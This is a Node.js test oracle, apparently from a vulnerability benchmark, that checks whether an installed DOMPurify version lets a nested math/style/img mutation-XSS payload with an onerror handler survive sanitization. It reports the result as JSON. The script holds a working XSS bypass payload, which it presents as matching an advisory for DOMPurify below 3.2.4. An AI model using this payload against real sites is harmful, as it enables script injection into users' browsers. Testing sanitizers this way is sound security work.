'use strict';
const { JSDOM } = (() => { try { return require('jsdom'); } catch (e) { return {}; } })();
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const createDOMPurify = require('dompurify');

    // Setup: create a DOM window using jsdom if available, else a minimal shim
    let window;
    if (JSDOM) {
      const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
      window = dom.window;
    } else {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'jsdom not available for setup'
      }));
      return;
    }

    const DOMPurify = createDOMPurify(window);

    const marker = 'dp_marker_' + Math.random().toString(36).slice(2);

    // Benign input first: prove basic sanitization works.
    const benignInput = '<p id="' + marker + '">Hello <b>world</b></p><script>alert(1)<\/script>';
    const benignResult = DOMPurify.sanitize(benignInput);

    const benignOk =
      typeof benignResult === 'string' &&
      benignResult.indexOf(marker) !== -1 &&
      benignResult.indexOf('<script') === -1 &&
      benignResult.indexOf('<b>world</b>') !== -1;

    if (!benignOk) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign sanitize call did not behave as expected: ' + benignResult
      }));
      return;
    }

    operation_completed = true;

    // Malicious input: template literal / mXSS-style payload known to bypass
    // DOMPurify 3.2.3 via mutation XSS using nested templates and math/svg
    // namespace confusion that allows a script-equivalent payload to survive
    // sanitization. This mirrors the GHSA advisory for DOMPurify <3.2.4.
    const xssMarker = 'XSS_' + marker;
    const maliciousInput =
      '<math><mtext><table><mglyph><style><img src=x onerror="window.__' +
      xssMarker +
      '__=true">';

    let maliciousResult;
    try {
      maliciousResult = DOMPurify.sanitize(maliciousInput);
    } catch (innerErr) {
      // An exception during the malicious call, after benign success, counts as blocked.
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious sanitize call threw: ' + String(innerErr && innerErr.message)
      }));
      return;
    }

    // Determine if the dangerous onerror/img payload survived sanitization.
    // If the vulnerable version fails to properly sanitize the nested
    // math/style/img construct, the resulting string will still contain
    // the onerror handler or an <img ... onerror> tag with our xssMarker.
    const containsDangerousHandler =
      typeof maliciousResult === 'string' &&
      /onerror\s*=/i.test(maliciousResult) &&
      maliciousResult.indexOf(xssMarker) !== -1;

    exploit_succeeded = containsDangerousHandler;

    evidence = exploit_succeeded
      ? 'Malicious payload survived sanitization, dangerous onerror handler present: ' + maliciousResult
      : 'Malicious payload was properly sanitized: ' + maliciousResult;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.stack ? err.stack : err)
    }));
  }
}

main();
